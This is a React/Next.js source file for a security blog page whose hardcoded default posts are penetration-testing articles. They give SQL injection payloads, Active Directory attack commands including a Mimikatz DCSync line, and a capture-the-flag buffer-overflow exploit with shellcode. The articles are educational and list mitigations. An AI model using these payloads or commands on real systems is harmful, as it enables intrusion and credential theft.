"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Shield, ArrowLeft, Search, Skull } from "lucide-react"
import Link from "next/link"

interface BlogPost {
  id: number
  title: string
  category: string
  status: string
  date: string
  views: string
  content: string
  featuredImage?: string
  slug: string
}

export default function BlogPage() {
  const [posts, setPosts] = useState<BlogPost[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedCategory, setSelectedCategory] = useState("All Categories")

  useEffect(() => {
    // Load posts from localStorage and refresh on storage changes
    const loadPosts = () => {
      const savedPosts = localStorage.getItem("blogPosts")
      if (savedPosts) {
        const parsedPosts = JSON.parse(savedPosts)
        // Only show published posts, sorted by date (newest first)
        const publishedPosts = parsedPosts
          .filter((post: BlogPost) => post.status === "published")
          .sort((a: BlogPost, b: BlogPost) => new Date(b.date).getTime() - new Date(a.date).getTime())
        setPosts(publishedPosts)
      } else {
        // Default posts if none saved
        setPosts([
          {
            id: 1,
            title: "Advanced SQL Injection Techniques in Modern Web Applications",
            category: "Web Security",
            status: "published",
            date: "Dec 15, 2024",
            views: "1.2k",
            content: `# Advanced SQL Injection Techniques in Modern Web Applications

## Introduction

SQL injection remains one of the most critical vulnerabilities in web applications. This comprehensive guide explores advanced techniques used in modern penetration testing scenarios.

## Key Techniques

### 1. Union-Based Injection

\`\`\`sql
' UNION SELECT 1,2,3,database(),5-- -
\`\`\`

### 2. Boolean-Based Blind Injection

\`\`\`sql
' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -
\`\`\`

### 3. Time-Based Blind Injection

\`\`\`sql
'; WAITFOR DELAY '00:00:05'-- -
\`\`\`

## Tools and Methodology

- **Burp Suite**: For intercepting and modifying requests
- **SQLMap**: Automated SQL injection detection and exploitation
- **Custom Scripts**: Python-based payload generation

## Real-World Examples

During a recent penetration test, I discovered a second-order SQL injection vulnerability in a financial application. The vulnerability existed in the user profile update functionality where user input was stored and later used in an unsafe SQL query.

## Mitigation Strategies

1. **Parameterized Queries**: Always use prepared statements
2. **Input Validation**: Implement strict input validation
3. **Least Privilege**: Database users should have minimal permissions
4. **WAF Implementation**: Deploy Web Application Firewalls

## Conclusion

Understanding these advanced SQL injection techniques is crucial for both offensive and defensive security professionals. Regular security assessments and code reviews can help identify and remediate these vulnerabilities before they can be exploited.

---

*Published by Ye Yint Thu | OSI Team Member*`,
            featuredImage: "/placeholder.svg?height=300&width=400",
            slug: "advanced-sql-injection-techniques-in-modern-web-applications",
          },
          {
            id: 2,
            title: "Active Directory Privilege Escalation: From User to Domain Admin",
            category: "Network Security",
            status: "published",
            date: "Dec 10, 2024",
            views: "890",
            content: `# Active Directory Privilege Escalation: From User to Domain Admin

## Overview

Active Directory environments are complex ecosystems that often contain misconfigurations leading to privilege escalation opportunities. This guide covers common techniques used during red team engagements.

## Common Attack Vectors

### 1. Kerberoasting

\`\`\`powershell
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
\`\`\`

### 2. ASREPRoasting

\`\`\`powershell
Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat
\`\`\`

### 3. DCSync Attack

\`\`\`powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'
\`\`\`

## Tools and Techniques

- **BloodHound**: For AD enumeration and attack path analysis
- **PowerView**: PowerShell-based AD reconnaissance
- **Mimikatz**: Credential extraction and manipulation
- **Rubeus**: Kerberos interaction toolkit

## Case Study

During a recent engagement, I identified a service account with unconstrained delegation privileges. This misconfiguration allowed for a complete domain compromise through a series of carefully crafted attacks.

## Defense Strategies

1. **Regular Audits**: Implement continuous AD security assessments
2. **Least Privilege**: Follow principle of least privilege
3. **Monitoring**: Deploy advanced threat detection
4. **Hardening**: Implement AD security baselines

---

*Published by Ye Yint Thu | OSI Team Member*`,
            featuredImage: "/placeholder.svg?height=300&width=400",
            slug: "active-directory-privilege-escalation-from-user-to-domain-admin",
          },
          {
            id: 3,
            title: "HTB Machine Writeup: Exploiting Custom Binary with Buffer Overflow",
            category: "CTF Writeup",
            status: "published",
            date: "Nov 28, 2024",
            views: "654",
            content: `# HTB Machine Writeup: Exploiting Custom Binary with Buffer Overflow

## Machine Information

- **Name**: CustomBinary
- **Difficulty**: Medium
- **OS**: Linux
- **Points**: 30

## Reconnaissance

Starting with an nmap scan to identify open services:

\`\`\`bash
nmap -sC -sV -oA nmap/custombinary 10.10.10.xxx
\`\`\`

## Initial Access

The target machine was running a custom binary service on port 9999. Initial analysis revealed a buffer overflow vulnerability in the input handling function.

### Vulnerability Analysis

\`\`\`python
#!/usr/bin/env python3
import socket

# Create overflow payload
buffer = "A" * 1024
payload = buffer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.xxx", 9999))
s.send(payload.encode())
s.close()
\`\`\`

### Exploitation

After identifying the exact offset and developing a working exploit:

\`\`\`python
#!/usr/bin/env python3
import socket
import struct

# Shellcode for reverse shell
shellcode = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Build exploit
offset = 512
ret_addr = struct.pack("<I", 0xbffff7a0)
payload = "A" * offset + ret_addr + "\\x90" * 16 + shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.xxx", 9999))
s.send(payload.encode())
s.close()
\`\`\`

## Privilege Escalation

Once on the system, enumeration revealed a SUID binary with a path traversal vulnerability, leading to root access.

## Lessons Learned

1. Always check for custom services on unusual ports
2. Buffer overflow vulnerabilities still exist in modern applications
3. Proper input validation is crucial for application security

---

*Published by Ye Yint Thu | OSI Team Member*`,
            featuredImage: "/placeholder.svg?height=300&width=400",
            slug: "htb-machine-writeup-exploiting-custom-binary-with-buffer-overflow",
          },
        ])
      }
    }

    loadPosts()

    // Listen for storage changes to update posts in real-time
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === "blogPosts") {
        loadPosts()
      }
    }

    window.addEventListener("storage", handleStorageChange)

    // Also listen for custom events from the same tab
    const handleCustomUpdate = () => {
      loadPosts()
    }

    window.addEventListener("blogPostsUpdated", handleCustomUpdate)

    return () => {
      window.removeEventListener("storage", handleStorageChange)
      window.removeEventListener("blogPostsUpdated", handleCustomUpdate)
    }
  }, [])

  const filteredPosts = posts.filter((post) => {
    const matchesSearch =
      post.title.toLowerCase().includes(searchTerm.toLowerCase()) ||
      post.content.toLowerCase().includes(searchTerm.toLowerCase())
    const matchesCategory = selectedCategory === "All Categories" || post.category === selectedCategory
    return matchesSearch && matchesCategory
  })

  const categories = ["All Categories", ...Array.from(new Set(posts.map((post) => post.category)))]

  const getCategoryColor = (category: string) => {
    switch (category) {
      case "Web Security":
        return "bg-red-500/20 text-red-300 border-red-500/30"
      case "Network Security":
        return "bg-red-600/20 text-red-400 border-red-600/30"
      case "CTF Writeup":
        return "bg-red-700/20 text-red-200 border-red-700/30"
      case "Cloud Security":
        return "bg-red-800/20 text-red-300 border-red-800/30"
      case "Tools & Techniques":
        return "bg-gray-700/20 text-gray-300 border-gray-700/30"
      case "Research":
        return "bg-gray-600/20 text-gray-300 border-gray-600/30"
      default:
        return "bg-gray-500/20 text-gray-300 border-gray-500/30"
    }
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      {/* Animated Background */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        {/* Moving red particles */}
        <div className="absolute inset-0">
          {[...Array(20)].map((_, i) => (
            <div
              key={i}
              className="absolute w-2 h-2 bg-red-500 rounded-full opacity-30 animate-pulse"
              style={{
                left: `${Math.random() * 100}%`,
                top: `${Math.random() * 100}%`,
                animationDelay: `${Math.random() * 3}s`,
                animationDuration: `${3 + Math.random() * 2}s`,
              }}
            />
          ))}
        </div>

        {/* Moving gradient orbs */}
        <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-gradient-to-r from-red-600/20 to-red-800/20 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute bottom-1/4 right-1/4 w-80 h-80 bg-gradient-to-r from-red-500/15 to-red-700/15 rounded-full blur-3xl animate-pulse delay-1000"></div>

        {/* Flowing lines animation */}
        <div className="absolute inset-0 opacity-10">
          <svg className="w-full h-full">
            <defs>
              <linearGradient id="redGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stopColor="#dc2626" />
                <stop offset="100%" stopColor="#991b1b" />
              </linearGradient>
            </defs>
            <path
              d="M0,100 Q400,50 800,100 T1600,100"
              stroke="url(#redGradient)"
              strokeWidth="2"
              fill="none"
              className="animate-pulse"
            />
            <path
              d="M0,200 Q600,150 1200,200 T2400,200"
              stroke="url(#redGradient)"
              strokeWidth="1"
              fill="none"
              className="animate-pulse"
              style={{ animationDelay: "1s" }}
            />
          </svg>
        </div>
      </div>

      {/* Header */}
      <header className="relative z-50 border-b border-red-900/30 bg-black/90 backdrop-blur-xl sticky top-0">
        <div className="container mx-auto px-6 py-4">
          <nav className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              {/* jrBX4 Logo */}
              <div className="relative group">
                <div className="flex items-center space-x-3 p-3 bg-gradient-to-r from-red-900/40 to-black/60 rounded-lg border border-red-600/40 shadow-lg backdrop-blur-sm">
                  <div className="relative">
                    <div className="p-2 bg-red-600/20 rounded-lg border border-red-500/30">
                      <Skull className="h-7 w-7 text-red-400" />
                    </div>
                    <div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                  </div>
                  <div>
                    <div className="text-xl font-bold bg-gradient-to-r from-red-400 to-red-600 bg-clip-text text-transparent">
                      jrBX4
                    </div>
                    <div className="text-xs text-red-400 font-medium">Security Elite</div>
                  </div>
                </div>
                <div className="absolute inset-0 bg-red-500/10 rounded-lg blur-md opacity-0 group-hover:opacity-100 transition-opacity"></div>
              </div>
              <div>
                <span className="text-2xl font-bold bg-gradient-to-r from-white to-red-200 bg-clip-text text-transparent">
                  Ye Yint Thu
                </span>
                <div className="text-xs text-red-400">Elite Penetration Tester</div>
              </div>
            </div>
            <div className="hidden md:flex space-x-8">
              <Link href="/" className="text-gray-300 hover:text-red-400 transition-colors">
                Home
              </Link>
              <Link href="/#about" className="text-gray-300 hover:text-red-400 transition-colors">
                About
              </Link>
              <Link href="/#experience" className="text-gray-300 hover:text-red-400 transition-colors">
                Experience
              </Link>
              <Link href="/#services" className="text-gray-300 hover:text-red-400 transition-colors">
                Services
              </Link>
              <Link href="/blog" className="text-red-400 font-medium hover:text-red-300 transition-colors">
                Blog
              </Link>
              <Link href="/#contact" className="text-gray-300 hover:text-red-400 transition-colors">
                Contact
              </Link>
            </div>
          </nav>
        </div>
      </header>

      {/* Hero Section */}
      <section className="py-32 px-6 relative z-10">
        <div className="container mx-auto">
          <div className="max-w-4xl mx-auto text-center">
            <Link href="/" className="inline-flex items-center text-gray-400 hover:text-white transition-colors mb-6">
              <ArrowLeft className="mr-2 h-4 w-4" />
              Back to Portfolio
            </Link>
            <h1 className="text-4xl md:text-6xl font-bold text-white mb-6">
              Security
              <span className="text-red-500 block">Insights</span>
            </h1>
            <p className="text-xl text-gray-300 mb-8 max-w-2xl mx-auto">
              Deep dives into cybersecurity, penetration testing techniques, and the latest security research.
            </p>
          </div>
        </div>
      </section>

      {/* Search and Filter */}
      <section className="py-8 px-4 bg-black/30 backdrop-blur-sm border-y border-red-900/20">
        <div className="container mx-auto">
          <div className="max-w-4xl mx-auto">
            <div className="flex flex-col md:flex-row gap-4 items-center justify-between">
              <div className="relative flex-1 max-w-md">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search articles..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full pl-10 pr-4 py-2 bg-gray-900/70 border border-red-900/30 rounded-md text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-500"
                />
              </div>
              <div className="flex items-center space-x-4">
                <select
                  value={selectedCategory}
                  onChange={(e) => setSelectedCategory(e.target.value)}
                  className="px-4 py-2 bg-gray-900/70 border border-red-900/30 rounded-md text-white focus:outline-none focus:ring-2 focus:ring-red-500"
                >
                  {categories.map((category) => (
                    <option key={category} value={category}>
                      {category}
                    </option>
                  ))}
                </select>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Featured Post */}
      {filteredPosts.length > 0 && (
        <section className="py-12 px-4">
          <div className="container mx-auto">
            <div className="max-w-6xl mx-auto">
              <h2 className="text-2xl font-bold text-white mb-8">Featured Article</h2>
              <Card className="bg-gray-900/50 border border-red-900/20 overflow-hidden hover:border-red-500/30 transition-colors">
                <div className="md:flex">
                  <div className="md:w-1/3">
                    <img
                      src={filteredPosts[0].featuredImage || "/placeholder.svg?height=300&width=400"}
                      alt="Featured article"
                      className="w-full h-48 md:h-full object-cover"
                    />
                  </div>
                  <div className="md:w-2/3 p-6">
                    <div className="flex items-center space-x-3 mb-4">
                      <Badge variant="secondary" className={getCategoryColor(filteredPosts[0].category)}>
                        {filteredPosts[0].category}
                      </Badge>
                      <span className="text-sm text-gray-400">{filteredPosts[0].date}</span>
                    </div>
                    <h3 className="text-2xl font-bold text-white mb-4">{filteredPosts[0].title}</h3>
                    <p className="text-gray-300 mb-6">{filteredPosts[0].content.substring(0, 200)}...</p>
                    <div className="flex items-center justify-between">
                      <span className="text-sm text-gray-400">15 min read</span>
                      <Link href={`/blog/${filteredPosts[0].slug}`}>
                        <Button className="bg-red-600 hover:bg-red-700 text-white">Read Full Article</Button>
                      </Link>
                    </div>
                  </div>
                </div>
              </Card>
            </div>
          </div>
        </section>
      )}

      {/* Blog Posts Grid */}
      <section className="py-12 px-4">
        <div className="container mx-auto">
          <div className="max-w-6xl mx-auto">
            <h2 className="text-2xl font-bold text-white mb-8">
              {searchTerm || selectedCategory !== "All Categories" ? "Filtered Articles" : "Latest Articles"}
            </h2>
            {filteredPosts.length === 0 ? (
              <div className="text-center py-12">
                <p className="text-gray-400 text-lg">No articles found matching your criteria.</p>
              </div>
            ) : (
              <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
                {filteredPosts.slice(1).map((post) => (
                  <Card
                    key={post.id}
                    className="bg-gray-900/50 border border-red-900/20 hover:border-red-500/30 transition-colors"
                  >
                    <div className="aspect-video overflow-hidden rounded-t-lg">
                      <img
                        src={post.featuredImage || "/placeholder.svg?height=200&width=350"}
                        alt="Blog post"
                        className="w-full h-full object-cover hover:scale-105 transition-transform"
                      />
                    </div>
                    <CardHeader>
                      <div className="flex items-center justify-between mb-2">
                        <Badge variant="secondary" className={getCategoryColor(post.category)}>
                          {post.category}
                        </Badge>
                        <span className="text-sm text-gray-400">{post.date}</span>
                      </div>
                      <CardTitle className="text-white hover:text-red-400 transition-colors">
                        <Link href={`/blog/${post.slug}`} className="block">
                          {post.title}
                        </Link>
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <CardDescription className="text-gray-300 mb-4">
                        {post.content.substring(0, 150)}...
                      </CardDescription>
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-gray-400">8 min read</span>
                        <Link
                          href={`/blog/${post.slug}`}
                          className="text-red-400 hover:text-red-300 text-sm font-medium"
                        >
                          Read More →
                        </Link>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}

            {/* Pagination */}
            {filteredPosts.length > 6 && (
              <div className="flex justify-center mt-12">
                <div className="flex space-x-2">
                  <Button variant="outline" className="border-red-900/30 text-gray-300 hover:bg-red-900/20">
                    Previous
                  </Button>
                  <Button className="bg-red-600 hover:bg-red-700 text-white">1</Button>
                  <Button variant="outline" className="border-red-900/30 text-gray-300 hover:bg-red-900/20">
                    2
                  </Button>
                  <Button variant="outline" className="border-red-900/30 text-gray-300 hover:bg-red-900/20">
                    3
                  </Button>
                  <Button variant="outline" className="border-red-900/30 text-gray-300 hover:bg-red-900/20">
                    Next
                  </Button>
                </div>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-red-900/30 bg-black/50 py-8 px-4 mt-20">
        <div className="container mx-auto text-center">
          <p className="text-gray-400">
            © {new Date().getFullYear()} Ye Yint Thu. All rights reserved. | Cybersecurity Blog
          </p>
        </div>
      </footer>
    </div>
  )
}
